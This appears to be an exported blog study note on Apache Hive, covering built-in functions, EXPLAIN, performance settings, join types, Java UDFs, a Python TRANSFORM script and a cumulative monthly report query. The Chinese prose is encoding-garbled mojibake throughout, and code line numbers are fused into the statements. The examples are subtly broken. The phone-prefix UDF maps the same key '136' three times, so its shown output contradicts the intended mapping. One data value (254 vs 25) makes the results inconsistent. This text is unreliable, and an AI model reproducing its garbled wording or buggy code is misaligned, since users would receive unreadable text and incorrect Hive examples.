å±•ç¤ºæ‰€æœ‰å‡½æ•° hive&gt;describe function xxx; è¯¦ç»†æè¿°å‡½æ•°ç”¨æ³• LIMITè¯­å¥ åˆ—åˆ«å åµŒå¥—selectè¯­å¥ 14.2 é«˜çº§å‡½æ•°åˆ†ç±» æ ‡å‡†å‡½æ•° reverse() upper() èšåˆå‡½æ•° avg() sum() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657select avg(id) from t3;select sum(id) from t3;# æœ€ç®€ç­”çš„åµŒå¥—hive (mydb)&gt; select t.id from (select * from t1 where id &gt; 3)t;# æœ€ç®€å•çš„ group by# if else çš„æ•ˆæœselect id, case when id &lt;= 2 then 'low'when id&gt;=3 and id &lt;4 then 'middle'when id&gt;=4 and id &lt;5 then 'high'else 'very high'end as id_highly from t1;----æ‰§è¡Œç»“æœ----id id_highly1 low2 low3 middle4 high5 very high--------------------select sid,case coursewhen 'yuwen' then scoreelse '0'end(åˆ«å) yuwencase coursewhen 'shuxue' then scoreelse '0'end(åˆ«å) shuxue# cast è½¬æ¢å‡½æ•°, å¤§æ¦‚æ˜¯è¿™ä¹ˆç”¨hive (mydb)&gt; select id from t1 where cast(id AS FLOAT) &lt;3.0;OKid12 - ![image-20180619150824031](http://p6i5vzkfk.bkt.clouddn.com/study/2018-06-19-070824.png) é¦–å…ˆå½“å‰ä¸å­˜åœ¨çš„åˆ—è¡¥0, ç„¶åæŒ‰ç…§å­¦å·åˆ†ç»„æ±‚å’Œ â€‹ ç„¶åæŒ‰ç…§ sid åˆ†ç»„æ±‚å’Œ/æ±‚æœ€å¤§å€¼, å°±å¯ä»¥äº† åŒä¸€åˆ—ä¸åŒçš„æ”¾åœ¨ä¸åŒçš„åˆ—ä¸Š, å¸¸ç”¨çš„æ–¹æ³• é¢è¯•é¢˜4 array_contains() desc function array_contains() è‡ªå®šä¹‰å‡½æ•° UDF 15. Hive æ€§èƒ½è°ƒä¼˜15.1 ä»€ä¹ˆæ—¶å€™å¯ä»¥é¿å…æ‰§è¡ŒMapReduceï¼Ÿ select * or select field1,field2 limite 10 whereè¯­å¥ä¸­åªæœ‰åˆ†åŒºå­—æ®µ ä½¿ç”¨æœ¬åœ°set hive.exec.mode.local.auto=true; 12345select * from t3;select name,age from t3;select name,age from t3 limit 2;select name,age from t3 where age=25;# å½“ where æ˜¯æœ¬åœ°å­—æ®µ(åˆ—ä¸­çš„å­—æ®µ), æ˜¯ä¸èµ° MRçš„ group byè¯­å¥ï¼š é€šå¸¸å’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨ï¼ŒæŒ‰ç…§ä¸€ä¸ªæˆ–è€…å¤šä¸ªåˆ—å¯¹ç»“æœè¿›è¡Œåˆ†ç»„ï¼Œç„¶åå¯¹æ¯ç»„æ‰§è¡Œèšåˆæ“ä½œ havingè¯­å¥ï¼š é™åˆ¶ç»“æœçš„è¾“å‡º hiveå°†æŸ¥è¯¢è½¬åŒ–ä¸ºMapReduceæ‰§è¡Œï¼Œhiveçš„ä¼˜åŒ–å¯ä»¥è½¬åŒ–ä¸ºmapreduceçš„ä¼˜åŒ–ï¼ 15.2 hiveæ˜¯å¦‚ä½•å°†æŸ¥è¯¢è½¬åŒ–ä¸ºMapReduceçš„ï¼Ÿ-EXPLAINçš„ä½¿ç”¨ hiveå¯¹sqlçš„æŸ¥è¯¢è®¡åˆ’ä¿¡æ¯è§£æ EXPLAIN SELECT COUNT(1) FROM T1; EXPLAIN EXTENDED æ˜¾ç¤ºè¯¦ç»†æ‰©å±•æŸ¥è¯¢è®¡åˆ’ä¿¡æ¯ EXPLAIN EXTENDED SELECT COUNT(1) FROM T1; ä¸ºå•¥æˆ‘çš„ explain extended åªæœ‰å›ºå®šçš„å‡ è¡Œ? å› ä¸ºè¿™ä¸ª count æ²¡æœ‰è°ƒåŠ¨ MR, ç”¨ sum å°±ä¼šå¯ç”¨ MR, ä¼šå‡ºç°é•¿é•¿çš„ log 12345678910111213141516171819---ä¸ä¼šå¯ç”¨ MRhive (mydb)&gt; explain EXTENDED select count(1) from t9;---ExplainSTAGE DEPENDENCIES: Stage-0 is a root stage ...--------------------------------è¿™é‡Œä¼šå¯ç”¨ MRhive (mydb)&gt; explain EXTENDED select sum(id) from t9;---ExplainSTAGE DEPENDENCIES: Stage-1 is a root stage Stage-0 depends on stages: Stage-1STAGE PLANS: Stage: Stage-1 .... 15.3 æ€§èƒ½è°ƒä¼˜15.3.1 æœ¬åœ°mr æœ¬åœ°æ¨¡å¼è®¾ç½®æ–¹å¼ï¼š set mapred.job.tracker=local; mapper çš„æœ¬åœ°æ¨¡å¼, åªæœ‰åœ¨å¼€å‘ä¸­æ‰ä¼šä½¿ç”¨ set hive.exec.mode.local.auto=true; Hive çš„æ‰§è¡Œæ¨¡å¼ å¯ä»¥ç”¨åœ¨ç”Ÿäº§ä¸­, å› ä¸ºæ˜¯è‡ªåŠ¨æ¨¡å¼, å¯æ ¹æ®å‚æ•°å˜åŒ– è®¾ç½®è¿™é‡Œæ‰ä¼šè½¬æˆ local hadoop æŒ‰ç…§è¿™é‡Œè®¾å®šçš„è§„åˆ™hive.exec.mode.local.auto.input.files.max æµ‹è¯• select 1 from wlan limit 5; ä¸‹é¢ä¸¤ä¸ªå‚æ•°æ˜¯local mrä¸­å¸¸ç”¨çš„æ§åˆ¶å‚æ•°: hive.exec.mode.local.auto.inputbytes.maxé»˜è®¤134217728 è®¾ç½®local mrçš„æœ€å¤§è¾“å…¥æ•°æ®é‡,å½“è¾“å…¥æ•°æ®é‡å°äºè¿™ä¸ªå€¼çš„æ—¶å€™ä¼šé‡‡ç”¨local mrçš„æ–¹å¼ hive.exec.mode.local.auto.input.files.maxé»˜è®¤æ˜¯4 è®¾ç½®local mrçš„æœ€å¤§è¾“å…¥æ–‡ä»¶ä¸ªæ•°,å½“è¾“å…¥æ–‡ä»¶ä¸ªæ•°å°äºè¿™ä¸ªå€¼çš„æ—¶å€™ä¼šé‡‡ç”¨local mrçš„æ–¹å¼ å¤§äºæ­¤æ•°æ—¶, å°±ä¸ä¼šè½¬åŒ–ä¸º local hadoop 1Cannot run job locally: Number of Input Files (= 6) is larger than hive.exec.mode.local.auto.input.files.max(= 4) å¯ä»¥è¿™æ ·ä¿®æ”¹local mrçš„æœ€å¤§è¾“å…¥æ–‡ä»¶ä¸ªæ•°å€¼, ä¸»è¦åœ¨è°ƒè¯•é˜¶æ®µä½¿ç”¨ 1234hive (mydb)&gt; set hive.exec.mode.local.auto.input.files.max=8;# è¿™æ ·è®¾ç½®äº†ä¹‹å, åªè¦æ–‡ä»¶æ•°&lt;=8, å°±ä¼šåœ¨æœ¬åœ°è¿è¡ŒJob running in-process (local Hadoop) 15.3.2 å¼€å¯å¹¶è¡Œè®¡ç®— å¼€å¯å¹¶è¡Œè®¡ç®—,å¢åŠ é›†ç¾¤çš„åˆ©ç”¨ç‡ set hive.exec.parallel=true; 15.3.3 è®¾ç½®ä¸¥æ ¼æ¨¡å¼ è®¾ç½®ä¸¥æ ¼æ¨¡å¼ set hive.mapred.mode=strict; è®¾ç½®éä¸¥æ ¼æ¨¡å¼ set hive.mapred.mode=nonstrict; strictå¯ä»¥ç¦æ­¢ä¸‰ç§ç±»å‹çš„æŸ¥è¯¢ï¼š å¼ºåˆ¶åˆ†åŒºè¡¨çš„whereæ¡ä»¶è¿‡æ»¤ Order byè¯­å¥å¿…é¡»ä½¿ç”¨limit hive (mydb)&gt; select id from t9 where class=&#39;job110&#39; order by id limit 3; é™åˆ¶ç¬›å¡å°”ç§¯æŸ¥è¯¢ 15.3.4 è°ƒæ•´mapperå’Œreducerçš„æ•°é‡ è°ƒæ•´mapperå’Œreducerçš„æ•°é‡ å¤ªå¤šmapå¯¼è‡´å¯åŠ¨äº§ç”Ÿè¿‡å¤šå¼€é”€ marpred.min.split.size æŒ‰ç…§è¾“å…¥æ•°æ®é‡å¤§å°ç¡®å®šreduceræ•°ç›®, `set mapred.reduce.tasks= é»˜è®¤3 dfs -count /åˆ†åŒºç›®å½•/* hive.exec.reducers.maxè®¾ç½®é˜»æ­¢èµ„æºè¿‡åº¦æ¶ˆè€— JVMé‡ç”¨ å°æ–‡ä»¶å¤šæˆ–taskå¤šçš„ä¸šåŠ¡åœºæ™¯ set mapred.job.reuse.jvm.num.task=10 ä¼šä¸€ç›´å ç”¨taskæ§½ 15.3.5 æ’åºæ–¹é¢çš„ä¼˜åŒ– order by è¯­å¥ï¼šæ˜¯å…¨å±€æ’åº, ç”¨çš„æ¯”è¾ƒå¤š 123# åŠ ä¸ª desc å°±æ˜¯å€’åºæ’åºhive (mydb)&gt; select id from bucket_table order by id desc limit 10;Automatically selecting local only mode for query sort by è¯­å¥ï¼š æ˜¯å•reduceæ’åº ä¸€èˆ¬ä¸ distribute byç»“åˆä½¿ç”¨ distribute byè¯­å¥ï¼šç±»ä¼¼äºåˆ†æ¡¶ï¼Œæ ¹æ®æŒ‡å®šçš„å­—æ®µå°†æ•°æ®åˆ†åˆ°ä¸åŒçš„ reducerï¼Œä¸”åˆ†å‘ç®—æ³•æ˜¯ hash æ•£åˆ— ä¸ sort by ç»“åˆç”¨çš„æ¯”è¾ƒå¤š, åœ¨æ¯ä¸ªåˆ†åŒºå†…æœ‰åº 12# æ³¨æ„æ­¤å¤„ distribute çš„ä½œç”¨hive (mydb)&gt; select id from bucket_table distribute by id sort by id desc limit 10; cluster byè¯­å¥ï¼š select * from t9 cluster by id; å¯ä»¥ç¡®ä¿ç±»ä¼¼çš„æ•°æ®çš„åˆ†å‘åˆ°åŒä¸€ä¸ªreduce taskä¸­ï¼Œå¹¶ä¸”ä¿è¯æ•°æ®æœ‰åº, é˜²æ­¢æ‰€æœ‰çš„æ•°æ®åˆ†å‘åˆ°åŒä¸€ä¸ªreduceä¸Šï¼Œå¯¼è‡´æ•´ä½“çš„jobæ—¶é—´å»¶é•¿ cluster byè¯­å¥çš„ç­‰ä»·è¯­å¥ï¼š å¦‚æœåˆ†æ¡¶å’Œsortå­—æ®µæ˜¯åŒä¸€ä¸ªæ—¶ï¼Œæ­¤æ—¶ï¼Œcluster by = distribute by + sort by distribute by Word sort by Word ASC 15.3.6 Map-sideèšåˆå¯ä»¥ç›´æ¥åœ¨ .hivercä¸­é…ç½® set hive.map.aggr=true; è¿™ä¸ªè®¾ç½®å¯ä»¥å°†é¡¶å±‚çš„èšåˆæ“ä½œæ”¾åœ¨Mapé˜¶æ®µæ‰§è¡Œï¼Œä»è€Œå‡è½»æ¸…æ´—é˜¶æ®µæ•°æ®ä¼ è¾“å’ŒReduceé˜¶æ®µçš„æ‰§è¡Œæ—¶é—´ï¼Œæå‡æ€»ä½“æ€§èƒ½ã€‚:TODO ä¸å¤ªæ‡‚ ç¼ºç‚¹ï¼šè¯¥è®¾ç½®ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ã€‚ æ‰§è¡Œselect count(1) from wlan; 15.3.6 Join ä¼˜åŒ– ä¼˜å…ˆè¿‡æ»¤åå†è¿›è¡Œ Join æ“ä½œï¼Œæœ€å¤§é™åº¦çš„å‡å°‘å‚ä¸ join çš„æ•°æ®é‡ å°è¡¨ join å¤§è¡¨ï¼Œæœ€å¥½å¯åŠ¨ mapjoin åœ¨ä½¿ç”¨å†™æœ‰ Join æ“ä½œçš„æŸ¥è¯¢è¯­å¥æ—¶æœ‰ä¸€æ¡åŸåˆ™:åº”è¯¥å°†æ¡ç›®å°‘çš„è¡¨/å­æŸ¥è¯¢æ”¾åœ¨ Join æ“ä½œ ç¬¦çš„å·¦è¾¹ã€‚ Join on çš„æ¡ä»¶ç›¸åŒçš„è¯ï¼Œæœ€å¥½æ”¾å…¥åŒä¸€ä¸ª jobï¼Œå¹¶ä¸” join è¡¨çš„æ’åˆ—é¡ºåºä»å°åˆ°å¤§ åœ¨ç¼–å†™ Join æŸ¥è¯¢è¯­å¥æ—¶ï¼Œå¦‚æœç¡®å®šæ˜¯ç”±äº join å‡ºç°çš„æ•°æ®å€¾æ–œï¼Œé‚£ä¹ˆè¯·åšå¦‚ä¸‹è®¾ç½®: set hive.skewjoin.key=100000; // è¿™ä¸ªæ˜¯ join çš„é”®å¯¹åº”çš„è®°å½•æ¡æ•°è¶…è¿‡è¿™ä¸ªå€¼åˆ™ä¼šè¿›è¡Œ åˆ†æ‹†ï¼Œå€¼æ ¹æ®å…·ä½“æ•°æ®é‡è®¾ç½® set hive.optimize.skewjoin=true; // å¦‚æœæ˜¯ join è¿‡ç¨‹å‡ºç°å€¾æ–œåº”è¯¥è®¾ç½®ä¸º true 16. è¡¨è¿æ¥ (åªæ”¯æŒç­‰å€¼è¿æ¥) 16.1 ç®€ä»‹ INNER JOIN ä¸¤å¼ è¡¨ä¸­éƒ½æœ‰ï¼Œä¸”ä¸¤è¡¨ç¬¦åˆè¿æ¥æ¡ä»¶ select t1.name,t1.age,t9.age from t9 join t1 on t1.name=t9.name; LEFT OUTER JOIN å·¦è¡¨ä¸­ç¬¦åˆwhereæ¡ä»¶å‡ºç°ï¼Œå³è¡¨å¯ä»¥ä¸ºç©º ä»å·¦è¡¨è¿”å›æ‰€æœ‰çš„è¡Œ(å­—æ®µ), å³è¡¨æ²¡æœ‰åŒ¹é…where æ¡ä»¶çš„è¯è¿”å›null RIGHT OUTER JOIN å³è¡¨ä¸­ç¬¦åˆwhereæ¡ä»¶å‡ºç°ï¼Œå·¦è¡¨å¯ä»¥ä¸ºç©º FULL OUTER JOIN è¿”å›æ‰€æœ‰è¡¨ç¬¦åˆwhereæ¡ä»¶çš„æ‰€æœ‰è®°å½•ï¼Œæ²¡æœ‰NULLæ›¿ä»£ LEFT SEMI-JOIN å·¦è¡¨ä¸­ç¬¦åˆå³è¡¨onæ¡ä»¶å‡ºç°ï¼Œå³è¡¨ä¸å‡ºç° Hive å½“å‰æ²¡æœ‰å®ç° IN/EXISTS å­æŸ¥è¯¢ï¼Œå¯ä»¥ç”¨ LEFT SEMI JOIN é‡å†™å­æŸ¥è¯¢è¯­å¥ã€‚LEFT SEMI JOIN çš„é™åˆ¶æ˜¯ï¼Œ JOIN å­å¥ä¸­å³è¾¹çš„è¡¨åªèƒ½åœ¨ ON å­å¥ä¸­è®¾ç½®è¿‡æ»¤æ¡ä»¶ï¼Œåœ¨ WHERE å­å¥ã€SELECT å­å¥æˆ–å…¶ä»–åœ°æ–¹è¿‡æ»¤éƒ½ä¸è¡Œã€‚ 12345SELECT a.key, a.value FROM aWHERE a.key in (SELECT b.key FROM B);# å¯ä»¥è¢«é‡å†™ä¸ºï¼šSELECT a.key, a.val FROM a LEFT SEMI JOIN b on (a.key = b.key) ç¬›å¡å°”ç§¯ æ˜¯m x nçš„ç»“æœ map-side JOIN åªæœ‰ä¸€å¼ å°è¡¨ï¼Œåœ¨mapperçš„æ—¶å€™å°†å°è¡¨å®Œå…¨æ”¾åœ¨å†…å­˜ä¸­ select /+ mapjoin(t9) /t1.name,t1.age from t9 JOIN t1on t1.name=t9.name; 16.2 ä»£ç æµ‹è¯•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192å…³äºhiveä¸­çš„å„ç§joinå‡†å¤‡æ•°æ®1,a2,b3,c4,d7,y8,u2,bb3,cc7,yy9,ppå»ºè¡¨ï¼šcreate table a(id int,name string)row format delimited fields terminated by ',';create table b(id int,name string)row format delimited fields terminated by ',';å¯¼å…¥æ•°æ®ï¼šload data local inpath '/home/hadoop/a.txt' into table a;load data local inpath '/home/hadoop/b.txt' into table b;å®éªŒï¼š** inner joinselect * from a inner join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 2 | b | 2 | bb || 3 | c | 3 | cc || 7 | y | 7 | yy |+-------+---------+-------+---------+--+**left joinselect * from a left join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 1 | a | NULL | NULL || 2 | b | 2 | bb || 3 | c | 3 | cc || 4 | d | NULL | NULL || 7 | y | 7 | yy || 8 | u | NULL | NULL |+-------+---------+-------+---------+--+**right joinselect * from a right join b on a.id=b.id;**select * from a full outer join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 1 | a | NULL | NULL || 2 | b | 2 | bb || 3 | c | 3 | cc || 4 | d | NULL | NULL || 7 | y | 7 | yy || 8 | u | NULL | NULL || NULL | NULL | 9 | pp |+-------+---------+-------+---------+--+**select * from a left semi join b on a.id = b.id;+-------+---------+--+| a.id | a.name |+-------+---------+--+| 2 | b || 3 | c || 7 | y |+-------+---------+--+ 17. Hiveè‡ªå®šä¹‰å‡½æ•° &amp; Transform17.1 è‡ªå®šä¹‰å‡½æ•°ç±»åˆ« UDF ä½œç”¨äºå•ä¸ªæ•°æ®è¡Œï¼Œäº§ç”Ÿä¸€ä¸ªæ•°æ®è¡Œä½œä¸ºè¾“å‡ºã€‚ï¼ˆæ•°å­¦å‡½æ•°ï¼Œå­—ç¬¦ä¸²å‡½æ•°ï¼‰ UDAF (ç”¨æˆ·å®šä¹‰èšé›†å‡½æ•°)ï¼šæ¥æ”¶å¤šä¸ªè¾“å…¥æ•°æ®è¡Œï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªè¾“å‡ºæ•°æ®è¡Œã€‚ï¼ˆcountï¼Œmaxï¼‰ 17.2 UDF å¼€å‘å®ä¾‹17.2.1 ç®€å•å…¥é—¨ å…ˆå¼€å‘ä¸€ä¸ªjavaç±»ï¼Œç»§æ‰¿UDFï¼Œå¹¶é‡è½½evaluateæ–¹æ³• 12345678910package com.rox.hive.udf;import org.apache.hadoop.hive.ql.exec.UDF;public class ToLowerCase extends UDF &#123; // å¿…é¡»æ˜¯ public public String evaluate(String field) &#123; String res = field.toLowerCase(); return res; &#125;&#125; æ‰“æˆjaråŒ…ä¸Šä¼ åˆ°æœåŠ¡å™¨ å°†jaråŒ…æ·»åŠ åˆ°hiveçš„classpath hive&gt;add JAR /home/ap/udf.jar; åˆ›å»ºä¸´æ—¶å‡½æ•°ä¸å¼€å‘å¥½çš„java classå…³è” Hive&gt;create temporary function tolowercase as &#39;com.rox.hive.udf.ToLowerCase&#39;; å³å¯åœ¨hqlä¸­ä½¿ç”¨è‡ªå®šä¹‰çš„å‡½æ•°strip select tolowercase(name) from t_1.. 17.2.2 ç¨ç¨å¤æ‚123456789101112131415161718192021222324252627282930313233343536373839404142# éœ€æ±‚: é€šè¿‡ä¸€äº›æ‰‹æœºå·åˆ¤æ–­æ‰‹æœºåŒºåŸŸ1364535532,101374535532,421384535532,341364535532,451384535532,22136-beijing137-shanghai138-guangzhou-----## 1.ç¼–å†™ UDF public static HashMap&lt;String, String&gt; provinceMap = new HashMap&lt;String, String&gt;(); static &#123; provinceMap.put("136", "beijing"); provinceMap.put("136", "shanghai"); provinceMap.put("136", "guangzhou"); &#125; public String evaluate(String phoneNum) &#123; return provinceMap.get(phoneNum.substring(0, 3)) == null ? "huoxing" : provinceMap.get(phoneNum.substring(0, 3)); &#125; ## 2.æ‰“åŒ…ä¸Šä¼ , æ·»åŠ åˆ° classpath, åˆ›å»ºä¸´æ—¶å‡½æ•°## 3.åˆ›å»ºè¡¨,åŠ è½½æ•°æ®create table flow_t(pnum string,flow int)row format delimited fields terminated by ',';load data local inpath '/home/ap/ihivedata/flow.tmp' into table flow_t;## 4.ä½¿ç”¨0: jdbc:hive2://cs2:10000&gt; select pnum,tolow(pnum),flow from flow_t;+-------------+------------+-------+| pnum | _c1 | flow |+-------------+------------+-------+| 1364535532 | guangzhou | 10 || 1374535532 | huoxing | 42 || 1384535532 | huoxing | 34 || 1364535532 | guangzhou | 45 || 1384535532 | huoxing | 22 |+-------------+------------+-------+ 17.2.3 æœ‰äº›å¤æ‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# è§£æ json æ•°æ®è¡¨ rating.json## 1. å†™ udf//ï£¿ï£¿ï£¿ï£¿ï£¿ com.rox.json.MovieRateBean ï£¿ï£¿ï£¿ï£¿package com.rox.json;import lombok.Getter;import lombok.Setter;@Getter@Setterpublic class MovieRateBean &#123; private String movie; private String rate; private String timeStamp; private String uid; @Override public String toString() &#123; return movie + "\t" + rate + "\t" + timeStamp + "\t" + uid; &#125;&#125;//ï£¿ï£¿ï£¿ï£¿ com.rox.json.JsonParser ï£¿ï£¿ï£¿ï£¿package com.rox.json;import java.io.IOException;import org.apache.hadoop.hive.ql.exec.UDF;import com.fasterxml.jackson.databind.ObjectMapper;public class JsonParser extends UDF &#123; public String evaluate(String jsonLine) &#123; ObjectMapper objectMapper = new ObjectMapper(); try &#123; MovieRateBean bean = objectMapper.readValue(jsonLine, MovieRateBean.class); return bean.toString(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return ""; &#125;&#125;====================================================## 2.æ‰“åŒ…ä¸Šä¼ , æ·»åŠ åˆ° classpath, åˆ›å»ºä¸´æ—¶å‡½æ•°, æ£€æŸ¥æ˜¯å¦æˆåŠŸshow functions;## 3.åˆ›å»ºè¡¨,åŠ è½½æ•°æ®create table t_json(line string) row format delimited;load data local inpath '/home/ap/ihivedata/flow.log' into table t_json;## 4.æ£€æŸ¥æ•°æ®select * from t_json limit 10;## 5.è°ƒç”¨å‡½æ•°0: jdbc:hive2://cs2:10000&gt; select jsonparser(line)parsedline from t_json limit 10;+---------------------+| parsedline |+---------------------+| 1193 5 978300760 1 || 661 3 978302109 1 || 914 3 978301968 1 || 3408 4 978300275 1 || 2355 5 978824291 1 || 1197 3 978302268 1 || 1287 5 978302039 1 || 2804 5 978300719 1 || 594 4 978302268 1 || 919 4 978301368 1 |+---------------------+// ä½†æ˜¯è¿™æ ·åªæ˜¯æŠŠæ¯ä¸€è¡Œè§£æå‡ºæ¥äº†, ## 6.åˆ é™¤åŸæ¥çš„è¡¨ drop table if exists t_rating;## 7.é‡æ–°åˆ›å»ºä¸€ä¸ªè¡¨create table t_rating(movieid string,rate int,timestring string,uid string)row format delimited fields terminated by '\t';## 8.æ ¹æ®æŸ¥å‡ºæ¥çš„æ¯ä¸€è¡Œ, æŒ‰ç…§ '\t'åˆ†å‰², ç„¶åå†æ’å…¥åˆ°è¡¨ä¸­create table t_rating asselect split(jsonparser(line),'\t')[0]as movieid, split(jsonparser(line),'\t')[1] as rate, split(jsonparser(line),'\t')[2] as timestring, split(jsonparser(line),'\t')[3] as uid from t_json limit 10;// ä½†æ˜¯æ‰§è¡Œç»“æœä¼šæŠ¥é”™,ä¸çŸ¥é“ä¸ºå•¥,éš¾é“æ˜¯ java ä»£ç çš„é—®é¢˜? :TODO-------## 9.å†…ç½®jsonå‡½æ•°select get_json_object(line,'$.movie') as moive,get_json_object(line,'$.rate') as rate from rat_json limit 10; 17.3 Transformå®ç°12345678910111213141516171819202122232425262728293031323334353637383940414243# 1ã€å…ˆåŠ è½½rating.jsonæ–‡ä»¶åˆ°hiveçš„ä¸€ä¸ªåŸå§‹è¡¨ t_jsoncreate table rat_json(line string) row format delimited;load data local inpath '/home/ap/rating.json' into table t_json;2ã€éœ€è¦è§£æjsonæ•°æ®æˆå››ä¸ªå­—æ®µï¼Œæ’å…¥ä¸€å¼ æ–°çš„è¡¨ t_ratingdrop table if exists t_rating;# åˆ›å»ºè¡¨create table t_rating(movieid string,rate int,timestring string,uid string)row format delimited fields terminated by '\t';# æ’å…¥, ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»º create table xx as + select...insert overwrite table t_ratingselect get_json_object(line,'$.movie') as moiveid, get_json_object(line,'$.rate') as rate, get_json_object(line,'$.timeStamp') as timestring,get_json_object(line,'$.uid') as uid from t_json;3. å†™ä¸€ä¸ª python è„šæœ¬vi weekday_mapper.py#!/bin/pythonimport sysimport datetimefor line in sys.stdin: line = line.strip() movieid, rating, timestring,userid = line.split('\t') weekday = datetime.datetime.fromtimestamp(float(timestring)).isoweekday() print '\t'.join([movieid, rating, str(weekday),userid]) 4. ä¿å­˜æ–‡ä»¶, ç„¶åå°†æ–‡ä»¶åŠ å…¥ hive çš„ classpathhive&gt;add FILE /home/hadoop/weekday_mapper.py;5. æ­¤æ—¶å¯ä»¥ç›´æ¥åˆ›å»ºæ–°è¡¨hive&gt;create TABLE u_data_new asSELECT TRANSFORM (movieid, rate, timestring,uid) USING 'python weekday_mapper.py' AS (movieid, rate, weekday,uid)FROM t_rating;6. æŸ¥è¯¢ç»“æœ## distinctçœ‹çœ‹æœ‰å¤šå°‘ä¸ªä¸é‡å¤çš„æ•°å­—select distinct(weekday) from u_data_new limit 10; 18. æ¡ˆä¾‹18.1 å¹¿å‘Šæ¨é€-ç”¨æˆ·ç”»åƒçš„ä»‹ç»ä¸€ä¸ªå¹¿å‘Šæ¨é€å¹³å°çš„é¡¹ç›®ç»“æ„ç¤ºæ„å›¾ 18.2 ç´¯è®¡æŠ¥è¡¨å®ç°å¥—è·¯(é¢è¯•)é¢˜: æ±‚æ¯ä¸ªæœˆçš„ç´¯è®¡è®¿é—®æ¬¡æ•° æ­¤å¤„çš„è®¿é—®æ¬¡æ•°å¯ä»¥æ¢æˆå·¥èµ„,ç­‰ç­‰.. æœ‰å¦‚ä¸‹è®¿å®¢è®¿é—®æ¬¡æ•°ç»Ÿè®¡è¡¨ t_access_times è®¿å®¢ æœˆä»½ è®¿é—®æ¬¡æ•° A 2015-01 5 A 2015-01 15 B 2015-01 5 A 2015-01 8 B 2015-01 25 A 2015-01 5 A 2015-02 4 A 2015-02 6 B 2015-02 10 B 2015-02 5 â€¦â€¦ â€¦â€¦ â€¦â€¦ éœ€è¦è¾“å‡ºæŠ¥è¡¨ï¼št_access_times_accumulate è®¿å®¢ æœˆä»½ æœˆè®¿é—®æ€»è®¡ ç´¯è®¡è®¿é—®æ€»è®¡ A 2015-01 33 33 A 2015-02 10 43 â€¦â€¦. â€¦â€¦. â€¦â€¦. â€¦â€¦. B 2015-01 30 30 B 2015-02 15 45 â€¦â€¦. â€¦â€¦. â€¦â€¦. â€¦â€¦. è§£é¢˜ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# å‡†å¤‡æ•°æ®vi t_access_timesA,2015-01,5A,2015-01,15B,2015-01,5A,2015-01,8B,2015-01,254A,2015-01,5A,2015-02,4A,2015-02,6B,2015-02,10B,2015-02,5----# å»ºè¡¨create table t_access_times(username string,month string,salary int)row format delimited fields terminated by ',';# åŠ è½½æ•°æ®load data local inpath '/home/ap/t_access_times' into table t_access_times;1ã€ç¬¬ä¸€æ­¥ï¼Œå…ˆæ±‚ä¸ªç”¨æˆ·çš„æœˆæ€»é‡‘é¢select username,month,sum(salary) as salary from t_access_times group by username,month;+-----------+----------+---------+--+| username | month | salary |+-----------+----------+---------+--+| A | 2015-01 | 33 || A | 2015-02 | 10 || B | 2015-01 | 30 || B | 2015-02 | 15 |+-----------+----------+---------+--+2ã€ç¬¬äºŒæ­¥ï¼Œå°†æœˆæ€»é‡‘é¢è¡¨ è‡ªå·±è¿æ¥ è‡ªå·±è¿æ¥create table aa as(select username,month,sum(salary) as salary from t_access_times group by username,month) A inner join (select username,month,sum(salary) as salary from t_access_times group by username,month) BA.username=B.username+-------------+----------+-----------+-------------+----------+-----------+--+| a.username | a.month | a.salary | b.username | b.month | b.salary |+-------------+----------+-----------+-------------+----------+-----------+--+| A | 2015-01 | 33 | A | 2015-01 | 33 || A | 2015-01 | 33 | A | 2015-02 | 10 || A | 2015-02 | 10 | A | 2015-01 | 33 || A | 2015-02 | 10 | A | 2015-02 | 10 || B | 2015-01 | 30 | B | 2015-01 | 30 || B | 2015-01 | 30 | B | 2015-02 | 15 || B | 2015-02 | 15 | B | 2015-01 | 30 || B | 2015-02 | 15 | B | 2015-02 | 15 |+-------------+----------+-----------+-------------+----------+-----------+--+3ã€ç¬¬ä¸‰æ­¥ï¼Œä»ä¸Šä¸€æ­¥çš„ç»“æœä¸­è¿›è¡Œåˆ†ç»„æŸ¥è¯¢ï¼Œåˆ†ç»„çš„å­—æ®µæ˜¯a.username a.monthæ±‚æœˆç´¯è®¡å€¼ï¼š å°†b.month &lt;= a.monthçš„æ‰€æœ‰b.salaryæ±‚å’Œå³å¯select A.username,A.month,max(A.salary) as salary,sum(B.salary) as accumulatefrom (select username,month,sum(salary) as salary from t_access_times group by username,month) A inner join (select username,month,sum(salary) as salary from t_access_times group by username,month) BonA.username=B.usernamewhere B.month &lt;= A.monthgroup by A.username,A.monthorder by A.username,A.month;+-------------+----------+---------+-------------+| a.username | a.month | salary | accumulate |+-------------+----------+---------+-------------+| A | 2015-01 | 33 | 33 || A | 2015-02 | 10 | 43 || B | 2015-01 | 259 | 259 || B | 2015-02 | 15 | 274 |+-------------+----------+---------+-------------+ 18.3 å¾…åšé¡¹ç›® 19.æ³¨æ„ç‚¹ ä½¿ç”¨èšåˆå‡½æ•°, åé¢ä¸€å®šè¦åˆ†ç»„(group by xxx), group by ä¼šè‡ªåŠ¨å»é‡ å¦‚æœ sql è¯­å¥ä¸­æœ‰ group by, é‚£ä¹ˆ select åé¢å¿…é¡»æœ‰ group by çš„å­—æ®µ, æˆ–èšåˆå‡½æ•° ä½¿ç”¨order by æ’åºæŸä¸ªå­—æ®µæ—¶, å¿…é¡»åœ¨ selectä¸­å‡ºç°æ­¤å­—æ®µ, å¦åˆ™ä¼šæ‰¾ä¸åˆ° :TODO å¾…éªŒè¯]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
